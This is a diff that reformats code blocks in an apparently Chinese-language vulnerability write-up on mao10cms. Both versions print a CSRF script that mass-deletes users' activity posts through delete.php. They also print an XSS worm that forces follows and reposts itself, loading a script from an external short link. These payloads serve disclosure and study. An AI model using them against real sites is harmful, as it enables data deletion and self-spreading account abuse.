@@ -113,32 +113,36 @@
 
 <p>在第231行虽然对权限进行了判定，只有管理员可以删除，但是并未对来源进行限制，因此可以对管理员进行CSRF攻击删除所有用户的动态信息，利用代码类似如下：</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;text/javascript&quot;</span><span class="o">&gt;</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">77</span> <span class="p">)</span> <span class="p">{</span><span class="k">continue</span><span class="p">;</span> <span class="c1">//skip itself}</span>
-        <span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
-        <span class="nx">m</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;http://localhost:8080/mao10cms-mysql/do/delete.php?type=activity&amp;id=&quot;</span> <span class="o">+</span> <span class="nx">i</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="o">&lt;</span><span class="err">/script&gt;</span></code></pre></div>
+<div>
+  <pre><code class="javascript">&lt;script type=&quot;text/javascript&quot;&gt;
+    for (var i = 0; i &lt; 1000; i++) {
+        if (i == 77 ) {continue; //skip itself}
+        m = new Image();
+        m.src = &quot;http://localhost:8080/mao10cms-mysql/do/delete.php?type=activity&amp;id=&quot; + i;
+    }
+&lt;/script&gt;</code></pre>
+</div>
 
 <h2 id="xss-worm">XSS Worm</h2>
 
 <p>由于在最新动态处都会显示最新的5条动态信息，并且是包含在模板页面当中的，也就说任何用户登陆后即可加载我们插入的js，进行恶意操作，这里我以关注对应用户和发布动态（维持Worm状态）为例，js代码如下：</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
-<span class="nx">m</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;link&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">href</span> <span class="o">+</span> <span class="s2">&quot;/../../../do/add_guanzhu.php?id=2&quot;</span><span class="p">;</span>
-<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;link&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">href</span> <span class="o">+</span> <span class="s2">&quot;/../../../do/activity.php&quot;</span><span class="p">;</span>
-<span class="kd">var</span> <span class="nx">post_str</span> <span class="o">=</span> <span class="s2">&quot;content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E&quot;</span><span class="p">;</span>
-<span class="kd">var</span> <span class="nx">ajax</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">ajax</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-<span class="p">}</span>
-<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span>
-    <span class="nx">ajax</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;Microsoft.XMLHTTP&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nx">ajax</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span><span class="nx">url</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
-<span class="nx">ajax</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span><span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
-<span class="nx">ajax</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">post_str</span><span class="p">);</span></code></pre></div>
+<div>
+  <pre><code class="javascript">var m = new Image();
+m.src = document.getElementsByTagName('link')[0].href + &quot;/../../../do/add_guanzhu.php?id=2&quot;;
+var url = document.getElementsByTagName('link')[0].href + &quot;/../../../do/activity.php&quot;;
+var post_str = &quot;content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E&quot;;
+var ajax = null;
+if (window.XMLHttpRequest) {
+    ajax = new XMLHttpRequest();
+}
+else if (window.ActiveXObject) {
+    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+}
+ajax.open(&quot;POST&quot;,url,true);
+ajax.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+ajax.send(post_str);</code></pre>
+</div>
 
 <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20160831/20.png" alt="" /></p>
 
